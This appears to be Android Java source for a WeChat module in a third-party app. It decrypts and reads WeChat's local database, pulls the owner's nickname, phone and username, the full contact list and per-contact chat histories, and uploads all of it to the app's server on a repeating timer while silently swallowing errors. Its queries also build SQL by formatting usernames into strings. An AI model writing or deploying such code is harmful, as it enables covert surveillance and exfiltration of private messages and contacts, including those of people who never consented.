package com.qingyun.zhiyunelu.ds.wechat;


import android.content.Context;
import android.os.Message;

import com.qingyun.zhiyunelu.ds.AppAssistant;
import com.qingyun.zhiyunelu.ds.Constants;
import com.qingyun.zhiyunelu.ds.data.WxFriends;
import com.qingyun.zhiyunelu.ds.data.WxLocalMsg;
import com.qingyun.zhiyunelu.ds.data.WxMyInfo;

import net.sqlcipher.Cursor;
import net.sqlcipher.database.SQLiteDatabase;

import java.util.ArrayList;
import java.util.List;

import io.reactivex.Observer;
import io.reactivex.disposables.Disposable;
import velites.android.support.wx.WechatHelper;
import velites.android.utility.utils.HandlerUtil;
import velites.java.utility.generic.Action1;
import velites.java.utility.generic.Action3;
import velites.java.utility.log.LogEntry;
import velites.java.utility.log.LogHub;
import velites.java.utility.misc.ExceptionUtil;
import velites.java.utility.misc.StringUtil;

/**
 * Created by luohongzhen on 03/12/2017.
 */

public class WxManager {

    private static final int ID_NICK_NAME = 4;
    private static final int ID_PHONE = 6;
    private static final int ID_USER_NAME = 42;


    private static final String TAG = WxManager.class.getSimpleName();
    private static HandlerUtil handlerUtil;
    private static final int MSG_TAG_UPLOAD_WX = 3001;

    private static void checkWxDatabase(Context context) {

        WechatHelper.checkWechatAndRun(context, AppAssistant.getDefaultContext().getCacheDir().getPath() + "/%s/" + Constants.FilePaths.WX_MS_DB_NAME, Constants.FilePaths.WX_SHARE_PREFS_PATH, Constants.FilePaths.WX_MICROMS_PATH, Constants.FilePaths.WX_MS_DB_NAME, new Action3<Boolean, String, net.sqlcipher.database.SQLiteDatabase>() {
            @Override
            public void a(Boolean isOk, String msg, SQLiteDatabase sql) {
                if (isOk && sql != null) {
                    userInfo(sql);
//                    try {
//                        List<WxLocalMsg> list = new ArrayList();
//                        StringBuffer buffer = new StringBuffer();
//                        buffer.append("SELECT m.msgId,m.msgSvrId,m.createTime,m.status,m.content,r.username,r.alias,r.conRemark,r.nickname").append(" FROM message m INNER JOIN rcontact r").append(" ON m.talker=r.username").append(" WHERE m.content IS NOT NULL").append(" AND r.verifyFlag=0").append(" AND r.nickname!=''").append(" AND r.type!=33").append(" AND r.type!=35").append(" ORDER BY").append(" m.createTime ASC").append(" LIMIT ?");
//                        Cursor c1 = sql.rawQuery(buffer.toString(), new String[]{String.valueOf(100)});
//                        while (c1.moveToNext()) {
//                            list.add(WxLocalMsg.buildMsgFromWxDb(c1));
//                        }
//                        c1.close();
//                        LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "list size:%d", list.size()));
//                    } catch (Exception e) {
//                        e.printStackTrace();
//                    }

                } else {
                    LogHub.log(new LogEntry(LogHub.LOG_LEVEL_ERROR, WxManager.class, "get wx database error msg %s", msg));
                }
            }
        });
    }

    private static final void userInfo(SQLiteDatabase sql) {
        if (sql != null) {
            StringBuffer buffer = new StringBuffer();
            buffer.append(String.format("SELECT * FROM userinfo WHERE id=%s or id=%s or id=%s", ID_NICK_NAME, ID_PHONE, ID_USER_NAME));
            Cursor c1 = sql.rawQuery(buffer.toString(), null);
            if (c1 != null) {
                String[] content = new String[3];
                int i = 0;
                while (c1.moveToNext()) {
                    String value = c1.getString(c1.getColumnIndex("value"));
                    if (i >= 3)
                        break;

                    content[i] = value;
                    i++;
                }

                createRContactFromDataBase(sql, new WxMyInfo(content[0], content[1], content[2]));
            }
        }
    }

    private static final void createRContactFromDataBase(SQLiteDatabase sql, WxMyInfo userInfo) {
        if (sql != null) {
            try {
                LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "wx my info:%s", userInfo != null ? userInfo.toString() : "null"));
                WxFriends friendsData = new WxFriends();
                List<WxFriends> list = new ArrayList();
                StringBuffer buffer = new StringBuffer();
                buffer.append("SELECT * FROM rcontact");
                Cursor c1 = sql.rawQuery(buffer.toString(), null);
                while (c1.moveToNext()) {
                    list.add(WxFriends.buildFriendsFromDatabase(c1));
                }
                c1.close();
                friendsData.setFriends(list);

                AppAssistant.getApi().uploadFriends(list, userInfo.getUserName(), userInfo.getNickName()).subscribe(new Observer<WxFriends>() {
                    @Override
                    public void onSubscribe(Disposable d) {
                    }

                    @Override
                    public void onNext(WxFriends friends) {
                        try {
                            if (friends != null && friends.getData() != null) {
                                uploadMsg(friends.getData().getFriends(), sql, userInfo);
                            }
                            LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "wxfriends %s", friends != null ? friends.toString() : "null"));
                        } catch (Exception e) {
                            ExceptionUtil.swallowThrowable(e);
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        ExceptionUtil.swallowThrowable(e);
                    }

                    @Override
                    public void onComplete() {
                    }
                });

            } catch (Exception e) {
                ExceptionUtil.swallowThrowable(e);
                e.printStackTrace();
            }
        }
    }


    private static final void uploadMsg(List<WxFriends> friends, SQLiteDatabase sql, WxMyInfo userInfo) {
        if (friends != null) {
            WxLocalMsg localMsg = new WxLocalMsg();
            localMsg.setRepUserName(userInfo != null ? userInfo.getUserName() : "");
            List<WxLocalMsg> userChats = new ArrayList<>();
            localMsg.setUserChats(userChats);
            for (int i = 0; i < friends.size(); i++) {
                WxFriends item = friends.get(i);
                if (item != null) {
                    WxLocalMsg user = new WxLocalMsg();
                    user.setUserName(item.getUserName());
                    StringBuffer buffer = new StringBuffer();
                    buffer.append(String.format("SELECT * FROM message WHERE talker=\'%s\' AND createTime > %s ORDER BY createTime ASC", item.getUserName(), StringUtil.isNullOrEmpty(item.getLastUpdateTime()) ? "0" : item.getLastUpdateTime()));
                    Cursor c = sql.rawQuery(buffer.toString(), null);
                    if (c != null) {
                        List<WxLocalMsg> chats = new ArrayList<>();
                        while (c.moveToNext()) {
                            WxLocalMsg msgItem = WxLocalMsg.buildMsgFromWxDb(c);
                            chats.add(msgItem);
                        }
                        user.setChats(chats);
                    }
                    if (user.getChats() == null || user.getChats().size() == 0)
                        continue;
                    userChats.add(user);
                }
            }
            try {
                AppAssistant.getApi().uploadWxMsg(localMsg).subscribe(new Observer<WxLocalMsg>() {
                    @Override
                    public void onSubscribe(Disposable d) {

                    }

                    @Override
                    public void onNext(WxLocalMsg wxLocalMsg) {
                        try {
                            LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "upload msg:%s", wxLocalMsg == null ? "null" : wxLocalMsg.toString()));
                        } catch (Exception e) {
                            ExceptionUtil.swallowThrowable(e);
                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        ExceptionUtil.swallowThrowable(e);
                    }

                    @Override
                    public void onComplete() {
                    }
                });

            } catch (Exception e) {
                ExceptionUtil.swallowThrowable(e);
            }
        }
    }

    public static void initWxManager(final Context ctx) {
        if (handlerUtil != null)
            handlerUtil.releaseData();

        handlerUtil = HandlerUtil.create(false, TAG, new Action1<Message>() {
            @Override
            public void a(Message arg1) {
                checkWxDatabase(ctx);
            }
        }, Thread.NORM_PRIORITY);
        LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "ini wx manager"));
        handlerUtil.sendEmptyMessageDelayed(MSG_TAG_UPLOAD_WX, Constants.UPLOAD_WX_CYCLE);
    }

    public static void startUpload() {
        if (handlerUtil != null) {
            LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "start upload wx info"));
            handlerUtil.sendEmptyMessage(MSG_TAG_UPLOAD_WX);
        }
    }

}
